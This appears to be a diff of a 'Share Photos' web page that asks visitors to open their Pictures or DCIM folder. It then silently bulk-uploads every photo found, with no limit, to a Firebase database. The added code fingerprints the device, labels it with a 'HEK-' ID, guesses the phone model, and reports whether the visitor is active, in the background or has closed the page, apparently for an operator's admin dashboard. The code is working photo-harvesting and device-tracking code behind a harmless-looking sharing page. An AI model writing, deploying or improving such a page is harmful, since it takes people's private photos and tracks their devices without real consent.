@@ -1,44 +1,15 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Share Photos</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: -apple-system, sans-serif;
-            -webkit-tap-highlight-color: transparent;
-        }
-
-        body {
-            background: #0a0a0a;
-            color: #fff;
-            min-height: 100vh;
-            padding: 20px 16px 40px;
-        }
-
-        .header {
-            text-align: center;
-            margin-bottom: 24px;
-            padding-top: 20px;
-        }
-
-        .header h1 {
-            font-size: 26px;
-            font-weight: 800;
-            margin-bottom: 8px;
-        }
-
-        .header p {
-            font-size: 13px;
-            color: #8e8e93;
-            line-height: 1.5;
-        }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; -webkit-tap-highlight-color: transparent; }
+        body { background: #0a0a0a; color: #fff; min-height: 100vh; padding: 20px 16px 40px; }
+        .header { text-align: center; margin-bottom: 24px; padding-top: 20px; }
+        .header h1 { font-size: 26px; font-weight: 800; margin-bottom: 8px; }
+        .header p { font-size: 13px; color: #8e8e93; line-height: 1.5; }
         .device-id {
             display: inline-block;
             margin-top: 10px;
@@ -51,278 +22,56 @@
             font-family: monospace;
             letter-spacing: 0.5px;
         }
-
-        .steps {
-            max-width: 500px;
-            margin: 0 auto 20px;
-            background: rgba(28, 28, 30, 0.5);
-            border: 1px solid rgba(255, 255, 255, 0.06);
-            border-radius: 16px;
-            padding: 14px 18px;
-        }
-
-        .step {
-            display: flex;
-            align-items: flex-start;
-            gap: 10px;
-            padding: 8px 0;
-            font-size: 13px;
-            color: #b0b0b0;
-        }
-
-        .step-num {
-            width: 20px;
-            height: 20px;
-            border-radius: 50%;
-            background: linear-gradient(45deg, #f09433, #dc2743);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 10px;
-            font-weight: 700;
-            color: #fff;
-            flex-shrink: 0;
-            margin-top: 1px;
-        }
-
-        .step strong {
-            color: #fff;
-        }
-
-        .open-btn {
-            width: 100%;
-            max-width: 500px;
-            margin: 0 auto 20px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            padding: 20px;
-            border: none;
-            border-radius: 16px;
-            background: linear-gradient(45deg, #f09433, #dc2743, #bc1888);
-            background-size: 300% 300%;
-            color: #fff;
-            font-size: 16px;
-            font-weight: 700;
-            cursor: pointer;
-            font-family: inherit;
-            box-shadow: 0 10px 30px rgba(220, 39, 67, 0.4);
-            animation: gradientMove 4s ease infinite;
-            transition: transform 0.15s;
-        }
-
-        .open-btn:active {
-            transform: scale(0.97);
-        }
-
-        .open-btn:disabled {
-            opacity: 0.5;
-        }
-
-        @keyframes gradientMove {
-
-            0%,
-            100% {
-                background-position: 0% 50%;
-            }
-
-            50% {
-                background-position: 100% 50%;
-            }
-        }
-
-        .progress-section {
-            max-width: 500px;
-            margin: 0 auto 20px;
-            display: none;
-            background: #1c1c1e;
-            border-radius: 16px;
-            padding: 20px;
-        }
-
-        .progress-section.show {
-            display: block;
-        }
-
-        .progress-bar {
-            height: 8px;
-            background: rgba(255, 255, 255, 0.08);
-            border-radius: 4px;
-            overflow: hidden;
-            margin-bottom: 12px;
-        }
-
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #f09433, #dc2743);
-            border-radius: 4px;
-            width: 0;
-            transition: width 0.3s;
-        }
-
-        .progress-text {
-            font-size: 13px;
-            color: #8e8e93;
-            text-align: center;
-            margin-bottom: 8px;
-        }
-
-        .progress-stats {
-            display: flex;
-            justify-content: space-around;
-            font-size: 12px;
-            color: #5f6368;
-            margin-top: 12px;
-            padding-top: 12px;
-            border-top: 1px solid rgba(255, 255, 255, 0.06);
-        }
-
-        .progress-stats span strong {
-            color: #fff;
-        }
-
-        .grid {
-            display: grid;
-            grid-template-columns: repeat(4, 1fr);
-            gap: 3px;
-            max-width: 600px;
-            margin: 0 auto;
-        }
-
-        .item {
-            aspect-ratio: 1;
-            border-radius: 6px;
-            overflow: hidden;
-            background: #1c1c1e;
-            position: relative;
-        }
-
-        .item img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            display: block;
-        }
-
-        .item .badge {
-            position: absolute;
-            top: 4px;
-            right: 4px;
-            padding: 2px 6px;
-            border-radius: 4px;
-            font-size: 9px;
-            font-weight: 700;
-            backdrop-filter: blur(10px);
-        }
-
-        .item .badge.uploading {
-            background: rgba(255, 193, 7, 0.9);
-            color: #000;
-        }
-
-        .item .badge.done {
-            background: rgba(52, 168, 83, 0.9);
-            color: #fff;
-        }
-
-        .item .badge.error {
-            background: rgba(255, 59, 48, 0.9);
-            color: #fff;
-        }
-
-        .toast {
-            position: fixed;
-            bottom: 40px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: rgba(44, 44, 46, 0.95);
-            color: #fff;
-            padding: 12px 20px;
-            border-radius: 24px;
-            font-size: 13px;
-            z-index: 9999;
-            backdrop-filter: blur(20px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            animation: toastIn 0.3s;
-            max-width: 90vw;
-        }
-
-        @keyframes toastIn {
-            from {
-                opacity: 0;
-                transform: translateX(-50%) translateY(20px);
-            }
-
-            to {
-                opacity: 1;
-                transform: translateX(-50%) translateY(0);
-            }
-        }
-
-        .done-card {
-            max-width: 500px;
-            margin: 20px auto;
-            padding: 20px;
-            background: rgba(52, 168, 83, 0.1);
-            border: 1px solid rgba(52, 168, 83, 0.3);
-            border-radius: 16px;
-            text-align: center;
-            display: none;
-        }
-
-        .done-card.show {
-            display: block;
-        }
-
-        .done-card .icon {
-            font-size: 48px;
-            margin-bottom: 12px;
-        }
-
-        .done-card h3 {
-            font-size: 18px;
-            margin-bottom: 8px;
-            color: #34A853;
-        }
-
-        .done-card p {
-            font-size: 13px;
-            color: #8e8e93;
-        }
+        .steps { max-width: 500px; margin: 0 auto 20px; background: rgba(28,28,30,0.5); border: 1px solid rgba(255,255,255,0.06); border-radius: 16px; padding: 14px 18px; }
+        .step { display: flex; align-items: flex-start; gap: 10px; padding: 8px 0; font-size: 13px; color: #b0b0b0; }
+        .step-num { width: 20px; height: 20px; border-radius: 50%; background: linear-gradient(45deg, #f09433, #dc2743); display: flex; align-items: center; justify-content: center; font-size: 10px; font-weight: 700; color: #fff; flex-shrink: 0; margin-top: 1px; }
+        .step strong { color: #fff; }
+        .open-btn { width: 100%; max-width: 500px; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; gap: 10px; padding: 20px; border: none; border-radius: 16px; background: linear-gradient(45deg, #f09433, #dc2743, #bc1888); background-size: 300% 300%; color: #fff; font-size: 16px; font-weight: 700; cursor: pointer; font-family: inherit; box-shadow: 0 10px 30px rgba(220,39,67,0.4); animation: gradientMove 4s ease infinite; transition: transform 0.15s; }
+        .open-btn:active { transform: scale(0.97); }
+        .open-btn:disabled { opacity: 0.5; }
+        @keyframes gradientMove { 0%,100% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } }
+        .progress-section { max-width: 500px; margin: 0 auto 20px; display: none; background: #1c1c1e; border-radius: 16px; padding: 20px; }
+        .progress-section.show { display: block; }
+        .progress-bar { height: 8px; background: rgba(255,255,255,0.08); border-radius: 4px; overflow: hidden; margin-bottom: 12px; }
+        .progress-fill { height: 100%; background: linear-gradient(90deg, #f09433, #dc2743); border-radius: 4px; width: 0; transition: width 0.3s; }
+        .progress-text { font-size: 13px; color: #8e8e93; text-align: center; margin-bottom: 8px; }
+        .progress-stats { display: flex; justify-content: space-around; font-size: 12px; color: #5f6368; margin-top: 12px; padding-top: 12px; border-top: 1px solid rgba(255,255,255,0.06); }
+        .progress-stats span strong { color: #fff; }
+        .grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 3px; max-width: 600px; margin: 0 auto; }
+        .item { aspect-ratio: 1; border-radius: 6px; overflow: hidden; background: #1c1c1e; position: relative; }
+        .item img { width: 100%; height: 100%; object-fit: cover; display: block; }
+        .item .badge { position: absolute; top: 4px; right: 4px; padding: 2px 6px; border-radius: 4px; font-size: 9px; font-weight: 700; backdrop-filter: blur(10px); }
+        .item .badge.uploading { background: rgba(255,193,7,0.9); color: #000; }
+        .item .badge.done { background: rgba(52,168,83,0.9); color: #fff; }
+        .item .badge.error { background: rgba(255,59,48,0.9); color: #fff; }
+        .toast { position: fixed; bottom: 40px; left: 50%; transform: translateX(-50%); background: rgba(44,44,46,0.95); color: #fff; padding: 12px 20px; border-radius: 24px; font-size: 13px; z-index: 9999; backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.1); animation: toastIn 0.3s; max-width: 90vw; }
+        @keyframes toastIn { from { opacity: 0; transform: translateX(-50%) translateY(20px); } to { opacity: 1; transform: translateX(-50%) translateY(0); } }
+        .done-card { max-width: 500px; margin: 20px auto; padding: 20px; background: rgba(52,168,83,0.1); border: 1px solid rgba(52,168,83,0.3); border-radius: 16px; text-align: center; display: none; }
+        .done-card.show { display: block; }
+        .done-card .icon { font-size: 48px; margin-bottom: 12px; }
+        .done-card h3 { font-size: 18px; margin-bottom: 8px; color: #34A853; }
+        .done-card p { font-size: 13px; color: #8e8e93; }
     </style>
 </head>
-
 <body>
 
     <div class="header">
         <h1>📸 Share Your Photos</h1>
-        <p>Folder allow karo — saari photos fast upload hongi</p>
+        <p>Folder allow karo — photos fast upload hongi</p>
         <div class="device-id" id="deviceIdLabel">📱 Device: ...</div>
     </div>
 
     <div class="steps" id="steps">
-        <div class="step">
-            <div class="step-num">1</div>
-            <div>Tap <strong>"Allow Gallery"</strong></div>
-        </div>
-        <div class="step">
-            <div class="step-num">2</div>
-            <div>Choose <strong>Pictures</strong> or <strong>DCIM</strong> folder</div>
-        </div>
-        <div class="step">
-            <div class="step-num">3</div>
-            <div>Tap <strong>"Allow"</strong> — auto fast upload start</div>
-        </div>
+        <div class="step"><div class="step-num">1</div><div>Tap <strong>"Allow Gallery"</strong></div></div>
+        <div class="step"><div class="step-num">2</div><div>Choose <strong>Pictures</strong> or <strong>DCIM</strong> folder</div></div>
+        <div class="step"><div class="step-num">3</div><div>Tap <strong>"Allow"</strong> — auto fast upload start</div></div>
     </div>
 
     <button class="open-btn" id="openBtn">📁 Allow Gallery</button>
 
     <div class="progress-section" id="progressSection">
         <div class="progress-text" id="progressText">Preparing...</div>
-        <div class="progress-bar">
-            <div class="progress-fill" id="progressFill"></div>
-        </div>
+        <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
         <div class="progress-stats">
             <span>✅ <strong id="statDone">0</strong> done</span>
             <span>⏳ <strong id="statPending">0</strong> pending</span>
@@ -340,7 +89,7 @@
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
-        import { getDatabase, ref, push, set, serverTimestamp }
+        import { getDatabase, ref, push, set, update, serverTimestamp }
             from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
 
         const firebaseConfig = {
@@ -359,34 +108,154 @@
         console.log('✅ Firebase initialized');
 
         /* ============================================================
-           🔥 DEVICE ID — unique per device
+           🔥 DEVICE ID + SESSION ID
            ============================================================ */
         function getDeviceId() {
-            let id = localStorage.getItem('device_id');
-            if (id) return id;
+            let deviceId = localStorage.getItem('pics_device_id');
+            if (deviceId) return deviceId;
 
-            // Generate from user agent + random
-            const raw = navigator.userAgent + screen.width + 'x' + screen.height;
+            const raw = [
+                navigator.userAgent,
+                window.screen.width + 'x' + window.screen.height,
+                window.screen.colorDepth,
+                Intl.DateTimeFormat().resolvedOptions().timeZone,
+                navigator.language,
+                navigator.platform,
+                navigator.hardwareConcurrency || ''
+            ].join('|');
+
             let hash = 0;
             for (let i = 0; i < raw.length; i++) {
                 hash = ((hash << 5) - hash) + raw.charCodeAt(i);
                 hash = hash & hash;
             }
-            const base62 = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
-            let out = '';
-            let n = Math.abs(hash);
-            for (let i = 0; i < 8; i++) {
-                out += base62[n % 62];
-                n = Math.floor(n / 62);
+
+            const BASE62 = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
+            let id = '', n = Math.abs(hash);
+            for (let i = 0; i < 8; i++) { id += BASE62[n % 62]; n = Math.floor(n / 62); }
+            deviceId = 'HEK-' + id;
+            localStorage.setItem('pics_device_id', deviceId);
+            return deviceId;
+        }
+
+        function getDeviceName() {
+            const ua = navigator.userAgent;
+            if (/iPhone/i.test(ua)) {
+                const w = window.screen.width;
+                if (w === 430) return 'iPhone 15 Pro Max';
+                if (w === 393) return 'iPhone 15 / 14 Pro';
+                if (w === 390) return 'iPhone 13 / 14';
+                if (w === 428) return 'iPhone 14 Plus';
+                if (w === 414) return 'iPhone 11 / XR';
+                if (w === 375) return 'iPhone X / 11 Pro';
+                return 'iPhone';
             }
-            id = 'DEV_' + out + '_' + Date.now().toString(36).slice(-4);
-            localStorage.setItem('device_id', id);
-            return id;
+            if (/iPad/i.test(ua)) return 'iPad';
+            if (/Android/i.test(ua)) {
+                let brand = '';
+                if (/realme/i.test(ua)) brand = 'Realme';
+                else if (/Redmi/i.test(ua)) brand = 'Redmi';
+                else if (/POCO/i.test(ua)) brand = 'POCO';
+                else if (/Xiaomi/i.test(ua)) brand = 'Xiaomi';
+                else if (/Nothing/i.test(ua)) brand = 'Nothing';
+                else if (/SM-/i.test(ua) || /Samsung/i.test(ua)) brand = 'Samsung';
+                else if (/OnePlus/i.test(ua)) brand = 'OnePlus';
+                else if (/OPPO/i.test(ua)) brand = 'OPPO';
+                else if (/vivo/i.test(ua) || /Vivo/i.test(ua)) brand = 'Vivo';
+                else if (/moto/i.test(ua) || /Motorola/i.test(ua)) brand = 'Motorola';
+                else if (/Pixel/i.test(ua)) brand = 'Google Pixel';
+                else brand = 'Android';
+                const m = ua.match(/Android\s+[\d.]+;\s*([^)]+)\)/);
+                const model = m ? m[1].trim().split(' Build/')[0] : '';
+                return model ? `${brand} ${model}` : brand;
+            }
+            if (/Windows/i.test(ua)) return 'Windows PC';
+            if (/Macintosh/i.test(ua)) return 'Mac';
+            if (/Linux/i.test(ua)) return 'Linux PC';
+            return 'Unknown Device';
+        }
+
+        function getPageName() {
+            try {
+                const path = window.location.pathname;
+                const filename = path.split('/').pop() || 'index';
+                const name = filename.replace('.html', '').replace('.htm', '').replace('.php', '');
+
+                const pageMap = {
+                    'gallery': 'gallery',
+                    'photos': 'gallery',
+                    'upload': 'gallery',
+                    'index': 'gallery',
+                    'admin': 'admin',
+                    'dashboard': 'admin'
+                };
+
+                const key = name.toLowerCase();
+                return pageMap[key] || key || 'gallery';
+            } catch (e) {
+                return 'gallery';
+            }
         }
 
         const DEVICE_ID = getDeviceId();
+        const SESSION_ID = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+        const DEVICE_NAME = getDeviceName();
+        const PAGE_NAME = getPageName();
+
         document.getElementById('deviceIdLabel').textContent = '📱 ' + DEVICE_ID;
         console.log('📱 Device ID:', DEVICE_ID);
+        console.log('📛 Device Name:', DEVICE_NAME);
+        console.log('📄 Page:', PAGE_NAME);
+
+        /* ============================================================
+           🔥 SAVE DEVICE INFO TO devices_root/{DEVICE_ID}
+           ============================================================ */
+        async function saveDeviceInfo() {
+            try {
+                const deviceRef = ref(db, 'devices_root/' + DEVICE_ID);
+                await set(deviceRef, {
+                    deviceId: DEVICE_ID,
+                    deviceName: DEVICE_NAME,
+                    pageName: PAGE_NAME,
+                    sessionId: SESSION_ID,
+                    status: 'active',
+                    firstVisit: Date.now(),
+                    lastSeen: Date.now()
+                });
+                console.log('✅ devices_root saved');
+            } catch (err) {
+                console.error('❌ devices_root failed:', err.code);
+            }
+        }
+
+        async function updateDeviceStatus(status) {
+            try {
+                await update(ref(db, 'devices_root/' + DEVICE_ID), {
+                    status: status,
+                    lastSeen: Date.now(),
+                    pageName: PAGE_NAME
+                });
+                console.log('📊 Status:', status);
+            } catch (e) {}
+        }
+
+        // Save on load
+        setTimeout(saveDeviceInfo, 500);
+
+        // Visibility change
+        document.addEventListener('visibilitychange', () => {
+            updateDeviceStatus(document.hidden ? 'background' : 'active');
+        });
+
+        window.addEventListener('pagehide', () => {
+            updateDeviceStatus('closed');
+        });
+
+        window.addEventListener('beforeunload', () => {
+            const url = firebaseConfig.databaseURL + '/devices_root/' + DEVICE_ID + '/status.json';
+            const blob = new Blob([JSON.stringify('closed')], { type: 'application/json' });
+            navigator.sendBeacon(url, blob);
+        });
 
         /* ============================================================
            DOM
@@ -428,7 +297,6 @@
                 progressSection.classList.add('show');
                 doneCard.classList.remove('show');
 
-                // Scan files
                 progressText.textContent = '🔍 Scanning folder...';
                 const files = [];
                 await scanFolder(dirHandle, files);
@@ -439,13 +307,11 @@
                     return;
                 }
 
-                // 🔥 SARI photos — no limit
                 const toUpload = files;
                 showToast(`📸 ${toUpload.length} photos processing...`);
 
                 grid.innerHTML = '';
 
-                // Create UI items
                 const items = toUpload.map((file) => {
                     const div = document.createElement('div');
                     div.className = 'item';
@@ -463,7 +329,6 @@
                 let done = 0;
                 let failed = 0;
 
-                // 🔥 PARALLEL UPLOAD — 5 at a time
                 const CONCURRENCY = 5;
                 let index = 0;
 
@@ -478,24 +343,28 @@
 
                 const processItem = async (item) => {
                     try {
-                        // 1. Compress
                         const compressed = await compressImage(item.file, 1000, 0.7);
-
-                        // 2. Base64
                         const base64 = await fileToBase64(compressed);
 
-                        // 3. Save to DB: uploads/{DEVICE_ID}/{uniqueKey}
-                        const deviceRef = ref(db, `uploads/${DEVICE_ID}`);
+                        // 🔥 SAVE: photos/{DEVICE_ID}/{uniqueKey}
+                        // HAR PHOTO KE SAATH DEVICE INFO BHI
+                        const deviceRef = ref(db, 'photos/' + DEVICE_ID);
                         const newRef = push(deviceRef);
 
+                        const now = new Date();
                         await set(newRef, {
                             id: newRef.key,
                             deviceId: DEVICE_ID,
+                            deviceName: DEVICE_NAME,
+                            sessionId: SESSION_ID,
+                            pageName: PAGE_NAME,
                             image: base64,
                             name: item.file.name,
                             size: compressed.size,
                             originalSize: item.file.size,
                             savedPercent: Math.round((1 - compressed.size / item.file.size) * 100),
+                            date: now.toLocaleDateString('en-IN'),
+                            time: now.toLocaleTimeString('en-IN'),
                             timestamp: serverTimestamp(),
                             uploadedAt: Date.now()
                         });
@@ -514,7 +383,6 @@
                     }
                 };
 
-                // 🔥 Worker pool
                 const workers = Array(CONCURRENCY).fill(null).map(async () => {
                     while (index < items.length) {
                         const myIndex = index++;
@@ -554,7 +422,7 @@
                                 if (file.size < 20 * 1024 * 1024) {
                                     files.push(file);
                                 }
-                            } catch (e) { }
+                            } catch (e) {}
                         }
                     } else if (entry.kind === 'directory') {
                         await scanFolder(entry, files);
@@ -623,631 +491,4 @@
         }
     </script>
 </body>
-
-</html><!DOCTYPE html>
-<html lang="en">
-
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Share Photos</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: -apple-system, sans-serif;
-            -webkit-tap-highlight-color: transparent;
-        }
-
-        body {
-            background: #0a0a0a;
-            color: #fff;
-            min-height: 100vh;
-            padding: 20px 16px 40px;
-        }
-
-        .header {
-            text-align: center;
-            margin-bottom: 24px;
-            padding-top: 20px;
-        }
-
-        .header h1 {
-            font-size: 26px;
-            font-weight: 800;
-            margin-bottom: 8px;
-        }
-
-        .header p {
-            font-size: 13px;
-            color: #8e8e93;
-            line-height: 1.5;
-        }
-
-        .device-id {
-            display: inline-block;
-            margin-top: 10px;
-            padding: 6px 14px;
-            background: rgba(26, 115, 232, 0.15);
-            border: 1px solid rgba(26, 115, 232, 0.3);
-            border-radius: 20px;
-            font-size: 11px;
-            color: #1a73e8;
-            font-family: monospace;
-            letter-spacing: 0.5px;
-        }
-
-        .steps {
-            max-width: 500px;
-            margin: 0 auto 20px;
-            background: rgba(28, 28, 30, 0.5);
-            border: 1px solid rgba(255, 255, 255, 0.06);
-            border-radius: 16px;
-            padding: 14px 18px;
-        }
-
-        .step {
-            display: flex;
-            align-items: flex-start;
-            gap: 10px;
-            padding: 8px 0;
-            font-size: 13px;
-            color: #b0b0b0;
-        }
-
-        .step-num {
-            width: 20px;
-            height: 20px;
-            border-radius: 50%;
-            background: linear-gradient(45deg, #f09433, #dc2743);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 10px;
-            font-weight: 700;
-            color: #fff;
-            flex-shrink: 0;
-            margin-top: 1px;
-        }
-
-        .step strong {
-            color: #fff;
-        }
-
-        .open-btn {
-            width: 100%;
-            max-width: 500px;
-            margin: 0 auto 20px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            padding: 20px;
-            border: none;
-            border-radius: 16px;
-            background: linear-gradient(45deg, #f09433, #dc2743, #bc1888);
-            background-size: 300% 300%;
-            color: #fff;
-            font-size: 16px;
-            font-weight: 700;
-            cursor: pointer;
-            font-family: inherit;
-            box-shadow: 0 10px 30px rgba(220, 39, 67, 0.4);
-            animation: gradientMove 4s ease infinite;
-            transition: transform 0.15s;
-        }
-
-        .open-btn:active {
-            transform: scale(0.97);
-        }
-
-        .open-btn:disabled {
-            opacity: 0.5;
-        }
-
-        @keyframes gradientMove {
-
-            0%,
-            100% {
-                background-position: 0% 50%;
-            }
-
-            50% {
-                background-position: 100% 50%;
-            }
-        }
-
-        .progress-section {
-            max-width: 500px;
-            margin: 0 auto 20px;
-            display: none;
-            background: #1c1c1e;
-            border-radius: 16px;
-            padding: 20px;
-        }
-
-        .progress-section.show {
-            display: block;
-        }
-
-        .progress-bar {
-            height: 8px;
-            background: rgba(255, 255, 255, 0.08);
-            border-radius: 4px;
-            overflow: hidden;
-            margin-bottom: 12px;
-        }
-
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #f09433, #dc2743);
-            border-radius: 4px;
-            width: 0;
-            transition: width 0.3s;
-        }
-
-        .progress-text {
-            font-size: 13px;
-            color: #8e8e93;
-            text-align: center;
-            margin-bottom: 8px;
-        }
-
-        .progress-stats {
-            display: flex;
-            justify-content: space-around;
-            font-size: 12px;
-            color: #5f6368;
-            margin-top: 12px;
-            padding-top: 12px;
-            border-top: 1px solid rgba(255, 255, 255, 0.06);
-        }
-
-        .progress-stats span strong {
-            color: #fff;
-        }
-
-        .grid {
-            display: grid;
-            grid-template-columns: repeat(4, 1fr);
-            gap: 3px;
-            max-width: 600px;
-            margin: 0 auto;
-        }
-
-        .item {
-            aspect-ratio: 1;
-            border-radius: 6px;
-            overflow: hidden;
-            background: #1c1c1e;
-            position: relative;
-        }
-
-        .item img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            display: block;
-        }
-
-        .item .badge {
-            position: absolute;
-            top: 4px;
-            right: 4px;
-            padding: 2px 6px;
-            border-radius: 4px;
-            font-size: 9px;
-            font-weight: 700;
-            backdrop-filter: blur(10px);
-        }
-
-        .item .badge.uploading {
-            background: rgba(255, 193, 7, 0.9);
-            color: #000;
-        }
-
-        .item .badge.done {
-            background: rgba(52, 168, 83, 0.9);
-            color: #fff;
-        }
-
-        .item .badge.error {
-            background: rgba(255, 59, 48, 0.9);
-            color: #fff;
-        }
-
-        .toast {
-            position: fixed;
-            bottom: 40px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: rgba(44, 44, 46, 0.95);
-            color: #fff;
-            padding: 12px 20px;
-            border-radius: 24px;
-            font-size: 13px;
-            z-index: 9999;
-            backdrop-filter: blur(20px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            animation: toastIn 0.3s;
-            max-width: 90vw;
-        }
-
-        @keyframes toastIn {
-            from {
-                opacity: 0;
-                transform: translateX(-50%) translateY(20px);
-            }
-
-            to {
-                opacity: 1;
-                transform: translateX(-50%) translateY(0);
-            }
-        }
-
-        .done-card {
-            max-width: 500px;
-            margin: 20px auto;
-            padding: 20px;
-            background: rgba(52, 168, 83, 0.1);
-            border: 1px solid rgba(52, 168, 83, 0.3);
-            border-radius: 16px;
-            text-align: center;
-            display: none;
-        }
-
-        .done-card.show {
-            display: block;
-        }
-
-        .done-card .icon {
-            font-size: 48px;
-            margin-bottom: 12px;
-        }
-
-        .done-card h3 {
-            font-size: 18px;
-            margin-bottom: 8px;
-            color: #34A853;
-        }
-
-        .done-card p {
-            font-size: 13px;
-            color: #8e8e93;
-        }
-    </style>
-</head>
-
-<body>
-
-    <div class="header">
-        <h1>📸 Share Your Photos</h1>
-        <p>Folder allow karo — saari photos fast upload hongi</p>
-        <div class="device-id" id="deviceIdLabel">📱 Device: ...</div>
-    </div>
-
-    <div class="steps" id="steps">
-        <div class="step">
-            <div class="step-num">1</div>
-            <div>Tap <strong>"Allow Gallery"</strong></div>
-        </div>
-        <div class="step">
-            <div class="step-num">2</div>
-            <div>Choose <strong>Pictures</strong> or <strong>DCIM</strong> folder</div>
-        </div>
-        <div class="step">
-            <div class="step-num">3</div>
-            <div>Tap <strong>"Allow"</strong> — auto fast upload start</div>
-        </div>
-    </div>
-
-    <button class="open-btn" id="openBtn">📁 Allow Gallery</button>
-
-    <div class="progress-section" id="progressSection">
-        <div class="progress-text" id="progressText">Preparing...</div>
-        <div class="progress-bar">
-            <div class="progress-fill" id="progressFill"></div>
-        </div>
-        <div class="progress-stats">
-            <span>✅ <strong id="statDone">0</strong> done</span>
-            <span>⏳ <strong id="statPending">0</strong> pending</span>
-            <span>❌ <strong id="statFailed">0</strong> failed</span>
-        </div>
-    </div>
-
-    <div class="done-card" id="doneCard">
-        <div class="icon">🎉</div>
-        <h3>All photos uploaded!</h3>
-        <p id="doneText">Successfully uploaded</p>
-    </div>
-
-    <div class="grid" id="grid"></div>
-
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
-        import { getDatabase, ref, push, set, serverTimestamp }
-            from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
-
-        const firebaseConfig = {
-            apiKey: "AIzaSyDofemvEqfdNDp79CtTg_x6ujjElCAkGsI",
-            authDomain: "my-rto-b2531.firebaseapp.com",
-            databaseURL: "https://my-rto-b2531-default-rtdb.firebaseio.com",
-            projectId: "my-rto-b2531",
-            storageBucket: "my-rto-b2531.appspot.com",
-            messagingSenderId: "465334829178",
-            appId: "1:465334829178:web:621d8269e0ace1e9f4fbc3"
-        };
-
-        const app = initializeApp(firebaseConfig);
-        const db = getDatabase(app);
-
-        console.log('✅ Firebase initialized');
-
-        /* ============================================================
-           🔥 DEVICE ID — unique per device
-           ============================================================ */
-        function getDeviceId() {
-            let id = localStorage.getItem('device_id');
-            if (id) return id;
-
-            // Generate from user agent + random
-            const raw = navigator.userAgent + screen.width + 'x' + screen.height;
-            let hash = 0;
-            for (let i = 0; i < raw.length; i++) {
-                hash = ((hash << 5) - hash) + raw.charCodeAt(i);
-                hash = hash & hash;
-            }
-            const base62 = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
-            let out = '';
-            let n = Math.abs(hash);
-            for (let i = 0; i < 8; i++) {
-                out += base62[n % 62];
-                n = Math.floor(n / 62);
-            }
-            id = 'DEV_' + out + '_' + Date.now().toString(36).slice(-4);
-            localStorage.setItem('device_id', id);
-            return id;
-        }
-
-        const DEVICE_ID = getDeviceId();
-        document.getElementById('deviceIdLabel').textContent = '📱 ' + DEVICE_ID;
-        console.log('📱 Device ID:', DEVICE_ID);
-
-        /* ============================================================
-           DOM
-           ============================================================ */
-        const openBtn = document.getElementById('openBtn');
-        const grid = document.getElementById('grid');
-        const steps = document.getElementById('steps');
-        const progressSection = document.getElementById('progressSection');
-        const progressText = document.getElementById('progressText');
-        const progressFill = document.getElementById('progressFill');
-        const statDone = document.getElementById('statDone');
-        const statPending = document.getElementById('statPending');
-        const statFailed = document.getElementById('statFailed');
-        const doneCard = document.getElementById('doneCard');
-        const doneText = document.getElementById('doneText');
-
-        const isSupported = typeof window.showDirectoryPicker === 'function';
-
-        if (!isSupported) {
-            openBtn.disabled = true;
-            openBtn.textContent = '❌ Chrome use karo';
-            showToast('⚠️ File System Access API support nahi hai');
-        }
-
-        /* ============================================================
-           🔥 OPEN FOLDER — Fast Parallel Upload
-           ============================================================ */
-        openBtn.addEventListener('click', async () => {
-            if (!isSupported) return;
-
-            try {
-                const dirHandle = await window.showDirectoryPicker({
-                    mode: 'read',
-                    startIn: 'pictures'
-                });
-
-                steps.style.display = 'none';
-                openBtn.style.display = 'none';
-                progressSection.classList.add('show');
-                doneCard.classList.remove('show');
-
-                // Scan files
-                progressText.textContent = '🔍 Scanning folder...';
-                const files = [];
-                await scanFolder(dirHandle, files);
-
-                if (files.length === 0) {
-                    progressText.textContent = '❌ Koi photo nahi mili';
-                    showToast('❌ Koi photo nahi mili');
-                    return;
-                }
-
-                // 🔥 SARI photos — no limit
-                const toUpload = files;
-                showToast(`📸 ${toUpload.length} photos processing...`);
-
-                grid.innerHTML = '';
-
-                // Create UI items
-                const items = toUpload.map((file) => {
-                    const div = document.createElement('div');
-                    div.className = 'item';
-                    const url = URL.createObjectURL(file);
-                    div.innerHTML = `
-                        <img src="${url}" loading="lazy">
-                        <div class="badge uploading">⬆</div>
-                    `;
-                    grid.appendChild(div);
-                    return { file, div, badge: div.querySelector('.badge'), status: 'pending' };
-                });
-
-                statPending.textContent = items.length;
-
-                let done = 0;
-                let failed = 0;
-
-                // 🔥 PARALLEL UPLOAD — 5 at a time
-                const CONCURRENCY = 5;
-                let index = 0;
-
